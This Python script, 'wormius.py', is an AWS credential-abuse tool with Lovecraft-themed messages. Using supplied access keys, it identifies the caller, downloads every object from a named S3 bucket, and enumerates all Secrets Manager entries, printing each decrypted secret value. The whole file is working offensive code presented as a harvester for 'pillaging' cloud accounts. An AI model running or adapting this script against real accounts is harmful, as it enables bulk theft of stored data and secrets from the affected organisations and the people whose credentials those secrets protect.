#!/usr/bin/env python3
"""
Tool Name: wormius.py (The Wormius Translator)
Author: Erick Tafel (g1gs)
Purpose: Authenticated AWS S3 and Secrets Manager harvester with a H.P. Lovecraft theme.
"""

import boto3              # pip3 install boto3 in your VM/docker/host
import json
import os
import argparse
from datetime import datetime

# Custom serializer to bypass datetime JSON serialization issues
def serialize_datetime(obj):
    if isinstance(obj, datetime):
        return obj.isoformat()
    raise TypeError(f"Type {type(obj)} not serializable")

usage_example = """
Syntax Example:
  python3 wormius.py -k <ACCESS_KEY> -s <SECRET_KEY> -r eu-north-1 -b <BUCKET_NAME>
"""

parser = argparse.ArgumentParser(
    description="Wormius Translator - Authenticated AWS Explorer",
    epilog=usage_example,
    formatter_class=argparse.RawDescriptionHelpFormatter
)

parser.add_argument("-k", "--key", required=True, help="AWS Access Key ID")
parser.add_argument("-s", "--secret", required=True, help="AWS Secret Access Key")
parser.add_argument("-r", "--region", default="us-east-1", help="AWS Region (Default: us-east-1)")
parser.add_argument("-b", "--bucket", required=True, help="Target S3 Bucket Name to pillage")

# This catches syntax errors and forces your custom example string to print out
try:
    args = parser.parse_args()
except SystemExit:
    print(usage_example)
    raise

access_key = args.key
secret_access_key = args.secret
region = args.region
bucket_name = args.bucket

# Prepare local repository library to receive the files
try:
    os.mkdir(bucket_name)
except Exception:
    pass
os.chdir(bucket_name)

session = boto3.Session(
    aws_access_key_id=access_key, 
    aws_secret_access_key=secret_access_key,
    region_name=region
)

s3_client = session.client("s3")
sts_client = session.client("sts")
secrets_client = session.client("secretsmanager")

# --- Step 1: Querying the STS Identity ---
print("[*] Peer into the void to identify the calling entity...")
try:
    sts_identity = sts_client.get_caller_identity()
    if sts_identity:
        print(f"[+] Manifested Identity:")
        print(f"  -> UserId:  {sts_identity['UserId']}")
        print(f"  -> Account: {sts_identity['Account']}")
        print(f"  -> ARN:     {sts_identity['Arn']}\n")
except Exception as e:
    print(f"[-] The ritual fractured. Failed to verify identity: {e}\n")
    sts_identity = None

# --- Step 2: Pillaging S3 Bucket Objects ---
if sts_identity:
    print(f"[*] Excavate the S3 Vault: [{bucket_name}]")
    try:
        bucket_objects = s3_client.list_objects_v2(Bucket=bucket_name)
        
        if "Contents" in bucket_objects:
            print("[+] Discovering structural vault layout fragments:")
            for obj in bucket_objects["Contents"]:
                file_name = str(obj["Key"])
                print(f"  -> Fragment Located: {file_name}")
                
                with open(file_name, "wb") as local_file:
                    s3_client.download_fileobj(bucket_name, file_name, local_file)
                    print(f"    [+] {file_name} safely archived in the local library.")
        else:
            print("[-] The vault is barren. No files exist within this path.")
    except Exception as e:
        print(f"[-] Sanity Check: Access to S3 vault [{bucket_name}] is sealed or denied: {e}")

# --- Step 3: Extracting Hidden Secrets Manager Strings ---
print("\n[*] Unearthing locked Secrets Manager relics...")
try:
    secrets_list = secrets_client.list_secrets()
    if secrets_list and secrets_list.get("SecretList"):
        print("[+] Encrypted runes located in the database:")
        
        for secret in secrets_list.get("SecretList"):
            secret_name = secret["Name"]
            print(f"  -> Target Secret Found: {secret_name}")
            
            try:
                # Attempting plain-text translation/decryption of the secret payload
                secret_payload = secrets_client.get_secret_value(SecretId=secret_name)
                print(f"    [~] Translating forbidden secret string for [{secret_name}]:")
                
                # Format and print the raw decrypted contents cleanly
                formatted_secret = json.dumps(secret_payload, indent=4, sort_keys=True, default=serialize_datetime)
                print(formatted_secret)
                
            except Exception:
                print(f"    [-] Sanity Check: The seals on [{secret_name}] resist translation.")
    else:
        print("[-] No hidden secrets found within this dimensional plane.")
except Exception as e:
    print(f"[-] Sanity Check: Secrets Manager queries completely blocked: {e}")